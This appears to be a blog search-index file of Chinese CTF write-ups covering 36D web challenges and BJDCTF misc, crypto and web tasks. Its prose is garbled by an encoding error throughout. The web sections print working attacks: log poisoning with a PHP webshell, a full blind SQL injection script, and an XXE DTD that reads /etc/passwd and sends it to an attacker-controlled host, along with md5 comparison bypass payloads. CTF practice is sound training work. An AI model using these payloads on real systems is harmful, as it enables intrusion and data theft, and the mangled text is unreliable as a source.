<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>36D-web-ak-challenge</title>
    <url>/2020/07/31/36D-web-ak-challenge/</url>
    <content><![CDATA[<p>æ˜¨å¤©å°±çœ‹äº†ç­¾åˆ°é¢˜æ¯”è¾ƒåŒ†å¿™ï¼Œæ²¡çŒœç€æ–‡ä»¶åå°±æ²¡åšäº†ï¼Œä»Šå¤©å¥½å¥½å¤ç°<a id="more"></a></p>
<h2 id="ç­¾åˆ°-è§‚å·±"><a href="#ç­¾åˆ°-è§‚å·±" class="headerlink" title="ç­¾åˆ°_è§‚å·±"></a>ç­¾åˆ°_è§‚å·±</h2><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul>
<li>nginxæ—¥å¿—æ–‡ä»¶è·¯å¾„</li>
<li>UAå­—æ®µæ’å…¥ä¸€å¥è¯æœ¨é©¬</li>
</ul>
<h3 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>å¼€é¢˜ç»™äº†æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/php/i'</span>, $file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'error'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¼€å§‹ä»¥ä¸ºè€ƒç‚¹åœ¨preg_match()å‡½æ•°çš„ç»•è¿‡ï¼Œå°è¯•äº†æ•°ç»„å’Œæ¢è¡Œç¬¦è¿›è¡Œç»•è¿‡phpè¿‡æ»¤ï¼Œå…ˆå…¥ä¸ºä¸»äº†ï¼Œä»¥ä¸ºè¿‡æ»¤äº†phpåç¼€flagæ–‡ä»¶å°±æ˜¯flag.phpï¼Œæ²¡æœ‰è€ƒè™‘åˆ°flag.txt,è¿˜åœ¨é‚£å°è¯•äº†åŠå¤©çš„è·¯å¾„ç©¿è¶Š</p>
<p>çŸ¥é“äº†æ–‡ä»¶åç›´æ¥çŒœæµ‹åœ¨æ ¹ç›®å½•ä¸‹é¢</p>
<img src="/2020/07/31/36D-web-ak-challenge/1.png" class="">

<p>æ­£è§£åº”è¯¥ä¸æ˜¯è¿™æ ·åšçš„ï¼Œå…ˆçœ‹ä¸€ä¸‹nginxçš„æ—¥å¿—æ–‡ä»¶<code>?file=/var/log/nginx/access.log</code></p>
<img src="/2020/07/31/36D-web-ak-challenge/2.png" class="">

<p>çœ‹åˆ°äº†åŒ…å«UAå­—æ®µï¼Œå°è¯•èƒ½ä¸èƒ½åœ¨UAå­—æ®µæ’å…¥ä¸€å¥è¯ğŸï¼ŒæŠ“åŒ…æ·»åŠ ä¸€ä¸‹æ”¾åŒ…</p>
<img src="/2020/07/31/36D-web-ak-challenge/3.png" class="">

<p>å¯ä»¥çœ‹åˆ°æ ¹ç›®å½•ä¸‹çš„flag.txtæ–‡ä»¶ï¼Œå†è¯»å–</p>
<p>è¿˜æœ‰ä¸€ç§è§£æ³•ä½¿ç”¨ä¼ªåè®®data://ï¼Œä½†æ˜¯è¿™é¢˜è¡Œä¸é€šï¼Œallow_url_includeæ˜¯off(é™„ä¸Šä¼ªåè®®æ–‡ç« ï¼Œå¾ˆè¯¦ç»†<a href="https://blog.csdn.net/nzjdsds/article/details/82461043" target="_blank" rel="noopener">https://blog.csdn.net/nzjdsds/article/details/82461043</a>)</p>
<h2 id="web1-è§‚å­—"><a href="#web1-è§‚å­—" class="headerlink" title="web1_è§‚å­—"></a>web1_è§‚å­—</h2><h3 id="çŸ¥è¯†ç‚¹-1"><a href="#çŸ¥è¯†ç‚¹-1" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul>
<li>curlå‘½ä»¤</li>
<li>curlå‘½ä»¤ã€‚èƒ½å¤Ÿæ›¿æ¢.</li>
</ul>
<h3 id="è§£é¢˜æ­¥éª¤-1"><a href="#è§£é¢˜æ­¥éª¤-1" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>å¼€é¢˜é€æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#flag in http://192.168.7.68/flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">    $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">    $protocol = substr($url, <span class="number">0</span>,<span class="number">7</span>);</span><br><span class="line">    <span class="keyword">if</span>($protocol!=<span class="string">'http://'</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'ä»…é™httpåè®®è®¿é—®'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/\.|\;|\||\&lt;|\&gt;|\*|\%|\^|\(|\)|\#|\@|\!|\`|\~|\+|\'|\"|\.|\,|\?|\[|\]|\&#123;|\&#125;|\!|\&amp;|\$|0/'</span>, $url))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'ä»…é™åŸŸååœ°å€è®¿é—®'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">'curl '</span>.$url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥ç»™äº†flagçš„ä½ç½®ï¼Œé—®é¢˜æ˜¯æ€ä¹ˆç»•è¿‡è¿‡æ»¤è®©curlæ‰§è¡Œè¯»å–æ–‡ä»¶ä¿¡æ¯</p>
<p>è¿™é‡Œè¿›åˆ¶è½¬æ¢ä¸è¡Œï¼Œè¿‡æ»¤äº†0ï¼Œè½¬æ¢ä¸ºåè¿›åˆ¶ä¸º3232237380</p>
<p>è¿™é‡Œå°±è¦ç”¨åˆ°ä¸Šé¢é‚£çš„çŸ¥è¯†ç‚¹ç”¨(ã€‚)æ›¿ä»£(.)</p>
<img src="/2020/07/31/36D-web-ak-challenge/4.png" class="">

<h2 id="web2-è§‚æ˜Ÿ"><a href="#web2-è§‚æ˜Ÿ" class="headerlink" title="web2_è§‚æ˜Ÿ"></a>web2_è§‚æ˜Ÿ</h2><h3 id="çŸ¥è¯†ç‚¹-2"><a href="#çŸ¥è¯†ç‚¹-2" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul>
<li>substr()é€—å·è¢«è¿‡æ»¤æ—¶ç”¨from x1 for x2æ›¿ä»£</li>
<li>ifæ›¿ä»£ï¼Œcase when then else end</li>
</ul>
<h3 id="è§£é¢˜æ­¥éª¤-2"><a href="#è§£é¢˜æ­¥éª¤-2" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>å¼€é¢˜ï¼Œèƒ½é€‰æ‹©ä¸‰ä¸ªé“¾æ¥ï¼Œè·Ÿidæœ‰å…³ï¼Œé¦–å…ˆæƒ³åˆ°çš„æ˜¯SQLæ³¨å…¥</p>
<p>æµ‹è¯•ä¸€ä¸‹ï¼Œå‘ç°ç©ºæ ¼ã€é€—å·ã€asciiã€likeã€=ç­‰è¢«è¿‡æ»¤äº†</p>
<p><code>substr(database() from 1 for 1 )ä»£æ›¿substr(database(),1,1)</code></p>
<p><code>case whenä»£æ›¿if</code></p>
<p><code>ordä»£æ›¿ascii</code></p>
<p><code>regexpä»£æ›¿likeã€=</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://ac6a84ba-b399-4b05-8a0d-a103b394dfc9.chall.ctf.show/index.php?id=1^"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        payload1 = <span class="string">"case(ord(substr(database()from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end"</span>.format(i,j)<span class="comment">#web1</span></span><br><span class="line">        payload2 = <span class="string">"case(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)regexp(database()))from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end"</span>.format(i,j)<span class="comment">#flag,page,user</span></span><br><span class="line">        payload3 = <span class="string">"case(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)regexp(0x666c6167))from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end"</span>.format(i,j)<span class="comment">#FLAG_COLUMN,flag</span></span><br><span class="line">        payload4 = <span class="string">"case(ord(substr((select(group_concat(flag))from(flag))from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end"</span>.format(i,j)</span><br><span class="line">        <span class="comment"># print(payload1)</span></span><br><span class="line">        <span class="comment"># print(url+payload3)</span></span><br><span class="line">        r = requests.get(url+payload4)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"I asked nothing"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>æœ¬æ¥æƒ³ç”¨äºŒåˆ†æ³•ï¼Œä½†æ˜¯è¿™é¢˜å¥½åƒä¸å¤ªåˆé€‚ï¼Œå¸¸è§„æ–¹æ³•é€Ÿåº¦ä¹ŸæŒºå¿«çš„ï¼Œå°±ç”¨å¸¸è§„çš„ç›²æ³¨æ–¹æ³•å¥½äº†</p>
<h2 id="web3-è§‚å›¾"><a href="#web3-è§‚å›¾" class="headerlink" title="web3_è§‚å›¾"></a>web3_è§‚å›¾</h2><h3 id="çŸ¥è¯†ç‚¹-3"><a href="#çŸ¥è¯†ç‚¹-3" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul>
<li>openssl_decryptå‡½æ•°åŠ å¯†</li>
<li>rand()å‡½æ•°æœ€å¤§å€¼</li>
<li>æš´åŠ›ç ´è§£</li>
</ul>
<h3 id="è§£é¢˜æ­¥éª¤-3"><a href="#è§£é¢˜æ­¥éª¤-3" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>å¼€é¢˜æ˜¯ä¸€å¼ GIFå›¾ç‰‡ï¼ŒæŸ¥çœ‹æºç å‘ç°æç¤º</p>
<img src="/2020/07/31/36D-web-ak-challenge/5.png" class="">

<p>ç›´æ¥è®¿é—®showImage.phpï¼Œæ‹¿åˆ°äº†æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//$key = substr(md5('ctfshow'.rand()),3,8);</span></span><br><span class="line"><span class="comment">//flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'image'</span>]))&#123;</span><br><span class="line">    $image=$_GET[<span class="string">'image'</span>];</span><br><span class="line">    $str = openssl_decrypt($image, <span class="string">'bf-ecb'</span>, $key);</span><br><span class="line">    <span class="keyword">if</span>(file_exists($str))&#123;</span><br><span class="line">        header(<span class="string">'content-type:image/gif'</span>);</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents($str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä»æºç ä¸­å°±å¯ä»¥çœ‹å‡ºè¦çˆ†ç ´å‡ºkeyçš„å€¼ï¼ŒæŸ¥ä¸€ä¸‹opessl_decryptå‡½æ•°çš„ç”¨æ³•ï¼Œå°è¯•çˆ†ç ´</p>
<p>æºç ä¸­åªè¦æˆ‘ä»¬èƒ½å¤Ÿå¾—åˆ°è§£å¯†åçš„æ–‡ä»¶åå¹¶ä¸”å­˜åœ¨ï¼Œå°±èƒ½å¤ŸåŒ…å«è¯¥æ–‡ä»¶</p>
<p>å…ˆæ¥çœ‹ä¸€ä¸‹rand()å‡½æ•°çš„æœ€å¤§å€¼</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span>(getrandmax());</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="number">32767</span></span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢å°±ç¢°æ’å‡ºkeyçš„å€¼</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">32768</span>;$i++)&#123;</span><br><span class="line">    $key = substr(md5(<span class="string">'ctfshow'</span>.$i),<span class="number">3</span>,<span class="number">8</span>);</span><br><span class="line">    $image=<span class="string">"Z6Ilu83MIDw="</span>;</span><br><span class="line">    $str = openssl_decrypt($image, <span class="string">'bf-ecb'</span>, $key);</span><br><span class="line">    <span class="keyword">if</span>(strpos($str,<span class="string">"gif"</span>) <span class="keyword">or</span> strpos($str,<span class="string">"jpg"</span>) <span class="keyword">or</span> strpos($str,<span class="string">"png"</span>))&#123;</span><br><span class="line">        <span class="keyword">print</span>($str.<span class="string">" "</span>);</span><br><span class="line">        <span class="keyword">print</span>($i);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">327671.</span>jpg <span class="number">27347</span></span><br></pre></td></tr></table></figure>

<p>æ–‡ä»¶æ ¼å¼ä¸å¤–ä¹gif\png\jpg</p>
<p>åªè¦è§£å¯†åèƒ½å¤ŸåŒ¹é…åˆ°å°±ç®—æˆåŠŸäº†</p>
<p>å¾—åˆ°$içš„å€¼ä¸º27347</p>
<p>ä¸‹é¢å°±æ˜¯è§£å¯†äº†ï¼Œç”±äºæµè§ˆå™¨ä¼šè¿›è¡Œä¸€æ¬¡urlè§£ç ï¼Œè¿™é‡Œè¦è¿›è¡Œä¸€ä¸‹ç¼–ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$rand=<span class="number">27347</span>;</span><br><span class="line">$key = substr(md5(<span class="string">'ctfshow'</span>.$rand),<span class="number">3</span>,<span class="number">8</span>);</span><br><span class="line">$image=<span class="string">"config.php"</span>;</span><br><span class="line">$str = openssl_encrypt($image, <span class="string">'bf-ecb'</span>, $key);</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode($str);</span><br><span class="line"><span class="number">27347</span>N6bf8Bd8jm0SpmTZGl0isw==&lt;br /&gt;N6bf8Bd8jm0SpmTZGl0isw%<span class="number">3</span>D%<span class="number">3</span>D</span><br></pre></td></tr></table></figure>

<p>è®¿é—®</p>
<img src="/2020/07/31/36D-web-ak-challenge/6.png" class="">

<p>ä¸€å¼ æ‰“ä¸å¼€çš„å›¾ç‰‡ï¼Œä¸‹è½½ä¸‹æ¥ä¿å­˜ï¼Œnotepad++æ‰“å¼€å³å¯</p>
<img src="/2020/07/31/36D-web-ak-challenge/7.png" class="">

<h2 id="web4-è§‚å¿ƒ"><a href="#web4-è§‚å¿ƒ" class="headerlink" title="web4_è§‚å¿ƒ"></a>web4_è§‚å¿ƒ</h2><h3 id="çŸ¥è¯†ç‚¹-4"><a href="#çŸ¥è¯†ç‚¹-4" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul>
<li>xxeçš„DTDå®ä½“</li>
</ul>
<h3 id="è§£é¢˜æ­¥éª¤-4"><a href="#è§£é¢˜æ­¥éª¤-4" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><img src="/2020/07/31/36D-web-ak-challenge/8.png" class="">

<p>å åœæ—¶å¯ä»¥çœ‹åˆ°å‘api.phpï¼ŒPOSTä¼ å‚apiå’Œcity</p>
<p>å¯ä»¥çœ‹åˆ°æ–‡ä»¶æ ¼å¼æ˜¯xml</p>
<p>åº”è¯¥æ˜¯Blind_OOB_XXE ï¼Œè¿™é‡Œæœ‰ç¯‡æ–‡ç« <a href="https://blog.csdn.net/weixin_39194641/article/details/102251374" target="_blank" rel="noopener">https://blog.csdn.net/weixin_39194641/article/details/102251374</a></p>
<p>åœ¨è‡ªå·±çš„vpsä¸Šèµ·ä¸€ä¸ªxmlå’Œdtd</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://ip/test.dtd"</span>&gt;</span> </span></span><br><span class="line"><span class="meta">%remote;%int;%send; ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span><span class="tag">&lt;<span class="name">login</span>&gt;</span>bee<span class="tag">&lt;/<span class="name">login</span>&gt;</span><span class="tag">&lt;<span class="name">secret</span>&gt;</span>Any bugs?<span class="tag">&lt;/<span class="name">secret</span>&gt;</span><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % p1 SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % p2 &quot;&lt;!ENTITY xxe SYSTEM &#39;ip&#x2F;pass&#x3D;%p1;&#39;&gt;&quot;&gt;</span><br><span class="line">%p2;</span><br></pre></td></tr></table></figure>

<p>postä¼ å‚è®¿é—®è‡ªå·±çš„vpsç½‘é¡µå°±è¡Œ</p>
<img src="/2020/07/31/36D-web-ak-challenge/9.png" class="">]]></content>
      <tags>
        <tag>show</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTFwp</title>
    <url>/2020/01/17/BJDCTFwp/</url>
    <content><![CDATA[<p>Misc</p>
<ol>
<li>ç­¾ä¸ªåˆ°ï¼Ÿ<a id="more"></a></li>
</ol>
<p>æ–‡ä»¶ä¸‹è½½ä¸‹æ¥æ˜¯ä¸ªå‹ç¼©åŒ…ï¼Œè§£å‹ç¼©å‘ç°é‡Œé¢è¿˜æœ‰ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œç›´æ¥è§£å‹æç¤ºæ–‡ä»¶æŸåè§£å‹å¤±è´¥</p>
<img src="/2020/01/17/BJDCTFwp/%E7%AD%BE%E4%B8%AA%E5%88%B0.png" class="">

<p>ä¸å‡æ€ç´¢ï¼Œç›´æ¥ä¸¢åˆ°kalié‡Œé¢ï¼Œforemostä¸€ä¸‹ï¼Œåˆ†ç¦»å‡ºäº†ä¸€å¼ å›¾ç‰‡ï¼Œæ‰“å¼€æ˜¯äºŒç»´ç ï¼Œæ‰«ä¸€æ‰«ï¼Œæ‹¿åˆ°Flag</p>
<img src="/2020/01/17/BJDCTFwp/%E7%AD%BE%E4%B8%AA%E5%88%B01.png" class="">

<ol start="2">
<li>ä½ çŒœæˆ‘æ˜¯ä¸ªå•¥ï¼Ÿ</li>
</ol>
<p>ä¸‹è½½è¿‡æ¥æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œå‘ç°æ‰“ä¸å¼€ï¼Œæƒ³åˆ°å¯èƒ½æ˜¯æ–‡ä»¶åç¼€çš„é—®é¢˜ï¼Œä¸¢åˆ°winhexé‡Œé¢å‘ç°äº†æ˜¯pngå›¾ç‰‡ï¼Œæ­£æƒ³è¦æ”¹åç¼€çš„æ—¶å€™ï¼ŒæŠŠwinhexç›´æ¥æ‹‰åˆ°åº•å‘ç°äº†Flag</p>
<img src="/2020/01/17/BJDCTFwp/cai.png" class="">

<ol start="3">
<li>é¸¡ä½ å¤ªç¾</li>
</ol>
<p>å‹ç¼©åŒ…è§£å‹ï¼Œä¸€ä¸ªæ˜¯gifï¼Œä¸€ä¸ªæ˜¯å®ƒçš„å‰¯æœ¬ï¼ŒæŠŠgifæ–‡ä»¶ä¸¢åˆ°winhexé‡Œé¢ï¼Œæ²¡æœ‰å‘ç°ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ã€‚æœ¬ç€è¯•è¯•çš„æƒ³æ³•ï¼ŒæŠŠå‰¯æœ¬ä¸¢åˆ°winhexé‡Œé¢ï¼Œå‘ç°æœ€å¼€å¤´æœ‰9aï¼Œå†æƒ³åˆ°å‰é¢çš„æ˜¯gifæ–‡ä»¶ï¼Œgifæ–‡ä»¶å¤´åˆšå¥½æ˜¯GIF89aï¼ŒæŠŠæ–‡ä»¶å¤´è¡¥å…¨é‡æ–°ä¿å­˜ä¸ºGIFæ–‡ä»¶ï¼ŒFlagå‡ºæ¥äº†ã€‚</p>
<img src="/2020/01/17/BJDCTFwp/%E9%B8%A1%E5%A4%AA%E7%BE%8E.png" class="">

<ol start="4">
<li>just a rar</li>
</ol>
<p>ä¸‹è½½ä¸‹æ¥æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªå››ä½æ•°.rarçš„æ–‡ä»¶ï¼Œç›´æ¥ä¸Šå·¥å…·è¿›è¡Œçˆ†ç ´.</p>
<img src="/2020/01/17/BJDCTFwp/rar.png" class="">

<p>å¯†ç æ˜¯2016ï¼Œæ‰“å¼€è§£å‹ç¼©å¾—åˆ°ä¸€å¼ å›¾ç‰‡ï¼Œæ”¾åˆ°winhexé‡Œé¢ä»€ä¹ˆä¸œè¥¿éƒ½æ²¡æœ‰ï¼Œæ”¾åˆ°kalié‡Œï¼Œbinwalkï¼Œforemostéƒ½æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿</p>
<p>çªç„¶æƒ³åˆ°ä»¥å‰åšè¿‡çš„ä¸€é“é¢˜ï¼Œæ‰“å¼€å±æ€§ï¼Œåœ¨å¤‡æ³¨é‡Œæ‰¾åˆ°äº†flag</p>
<img src="/2020/01/17/BJDCTFwp/rar1.png" class="">

<p>Crypto</p>
<ol>
<li>sign in</li>
</ol>
<p>æ‰“å¼€æ˜¯è¿™æ ·çš„<img src="/2020/01/17/BJDCTFwp/signin1.png" class=""></p>
<p>æŠŠbase16ï¼Œ64ï¼Œ32æŒ¨ä¸ªè¯•ä¸€ä¸‹ï¼Œæ˜¯base16åŠ å¯†</p>
<p>æ‰¾ä¸€ä¸ªçº¿è§£å¯†ç½‘ç«™</p>
<img src="/2020/01/17/BJDCTFwp/signin.png" class="">

<ol start="2">
<li>ç¼–åˆ¶ä¸è°ƒåˆ¶</li>
</ol>
<p>æ‰“å¼€ä¸‹è½½æ–‡ä»¶å¾—åˆ°ä¸€ä¸ªtxtæ–‡ä»¶å’Œä¸€ä¸ªå¸¦hintçš„å›¾ç‰‡ï¼Œæ ¹æ®hintçš„å›¾ç‰‡çŒœæµ‹æ˜¯æ›¼å½»æ–¯ç‰¹åŠ å¯†</p>
<p>ç½‘ä¸Šæœåˆ°äº†ä¸€ä¸ªè„šæœ¬ï¼Œæ‹¿è¿‡æ¥è·‘ä¸€ä¸‹å°±å‡ºæ¥äº†</p>
<img src="/2020/01/17/BJDCTFwp/%E7%BC%96%E5%88%B6.png" class="">

<ol start="3">
<li>Polybius</li>
</ol>
<p>æ‰“å¼€æ–‡ä»¶</p>
<img src="/2020/01/17/BJDCTFwp/polybius.png" class="">

<p>Hintbase64è§£å¯†å¾—åˆ°æç¤ºæ˜æ–‡æ˜¯16ä½æ•°å­—</p>
<p>ç™¾åº¦äº†ä¸€ä¸‹æ‰¾åˆ°äº†å¯¹åº”çš„æ£‹ç›˜åŠ å¯†ï¼Œä¸è¿‡æ£‹ç›˜æœ‰æ”¹åŠ¨ï¼Œæƒ³åˆ°flagå¤§å¤šæ˜¯ä¸€å¥è¯ï¼Œé‚£å°±ä¸€ä¸ªä¸ªè¯•</p>
<img src="/2020/01/17/BJDCTFwp/%E6%A3%8B%E7%9B%98.jpg" class="">

<p>æ‰‹åŠ¨å¯¹åº”è§£å¯†ï¼Œå¾—åˆ°flagï¼šBJD{flagispolybius}</p>
<p>4.EASYRSA</p>
<img src="/2020/01/17/BJDCTFwp/RSA1.png" class="">

<p>æ‰“å¼€æ‹¿åˆ°çš„ä¸€æ®µä»£ç ï¼Œä¸Šç½‘æœäº†ä¸€ä¸‹æœ‰å…³RSAåŠ å¯†çš„çŸ¥è¯†ï¼Œå†æ‰¾äº†ä¸€ä¸ªå¯æ”»å‡»çš„è„šæœ¬æ¥è¿›è¡Œåè§£å…ˆå¾—åˆ°på’Œqï¼Œå†æ¥è§£mçš„å€¼ï¼Œæœ€ålong_to_bytes(m)å°±å¯ä»¥å¾—åˆ°flagäº†</p>
<img src="/2020/01/17/BJDCTFwp/rsa.png" class="">

<p>Web</p>
<p>1.Hello World</p>
<p>æ‰“å¼€é¢˜ç›®åœ°å€ï¼Œç‚¹å‡»sketch includedï¼Œå°±æ˜¯ç•Œé¢å¼€å§‹çš„é‚£ä¸ªï¼Œå‡ºç°æ–‡å­—æ³¨æ„ä½ çš„idï¼Œç”¨burp suiteæŠ“åŒ…ï¼Œæ ¹æ®æ”¾å‡ºæ¥çš„hintæ˜¯idä¸adminæœ‰å…³</p>
<p>åŒæ—¶åœ¨burpä¸­çœ‹åˆ°idçš„æ ¼å¼ï¼Œåœ¨è¯·æ±‚å¤´ä¸­æ·»åŠ id:admin+base64(admin),sendä¸€ä¸‹ï¼Œè¿”å›å¦‚ä¸‹</p>
<img src="/2020/01/17/BJDCTFwp/hello4.png" class="">

<p>X-Forwarded-For:127.0.0.1</p>
<img src="/2020/01/17/BJDCTFwp/hello1.png" class="">

<p>Referer:<a href="https://google.com" target="_blank" rel="noopener">https://google.com</a></p>
<img src="/2020/01/17/BJDCTFwp/hello2.png" class="">

<p>2.easy_upload</p>
<p>ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œä»¥jpgæ ¼å¼ä¸Šä¼ ï¼Œè®¿é—®æç¤ºç»™çš„åœ°å€</p>
<img src="/2020/01/17/BJDCTFwp/upload2.png" class="">

<p>å‚è€ƒäº†ä¸€ç¯‡åšå®¢ï¼Œå­¦åˆ°äº†ç›´æ¥è¯»å–æ–‡ä»¶ä¸­çš„å†…å®¹</p>
<img src="/2020/01/17/BJDCTFwp/upload.png" class="">

<p>3.Hidden serects</p>
<p>æŠ“ä¸€ä¸‹åŒ…ï¼Œå¯ä»¥å‘ç°æœ‰ä¸€æ®µpassword</p>
<img src="/2020/01/17/BJDCTFwp/hidden.png" class="">

<p>é€šè¿‡å°è¯•å‘ç°æ˜¯md5åŠ å¯†</p>
<p>è§£å¯†ç™»å½•ç½‘ç«™</p>
<p>æ‰“å¼€å‘ç°è¿˜æ˜¯æ²¡ä»€ä¹ˆä¸œè¥¿ï¼ŒF12å’Œctrlé”®éƒ½ä¸èƒ½ç”¨</p>
<p>è¿™é‡Œæˆ‘ç”¨äº†ä¸€ä¸ªæ’ä»¶å«restclient,æ‰¾åˆ°flag</p>
<img src="/2020/01/17/BJDCTFwp/hidden1.png" class="">

<p>4.easy md5</p>
<p>æŠ“ä¸€ä¸‹åŒ…ï¼Œåœ¨ååº”å¤´é‡Œæœ‰ä¸€ä¸ªhint</p>
<img src="/2020/01/17/BJDCTFwp/MD51.png" class="">

<p>æ ¹æ®æ ‘å“¥çš„ä¸€ç¯‡md5åšå®¢ç…§ç€å†™</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[https:&#x2F;&#x2F;largepoplar.xyz&#x2F;2019&#x2F;12&#x2F;27&#x2F;MD5%E7%9A%84%E4%B8%80%E7%B3%BB%E5%88%97%E9%97%AE%E9%A2%98&#x2F;](https:&#x2F;&#x2F;largepoplar.xyz&#x2F;2019&#x2F;12&#x2F;27&#x2F;MD5çš„ä¸€ç³»åˆ—é—®é¢˜&#x2F;)</span><br></pre></td></tr></table></figure>

<p>å…ˆæäº¤ffifdyopï¼ŒæŸ¥çœ‹é¡µé¢æºç </p>
<img src="/2020/01/17/BJDCTFwp/MD52.png" class="">

<p>å‘ç°æ˜¯md5å¼±æ¯”è¾ƒ</p>
<p>æ„é€ payload?a=QNKCDZO&amp;b=aabg7XSsï¼Œå¾—åˆ°</p>
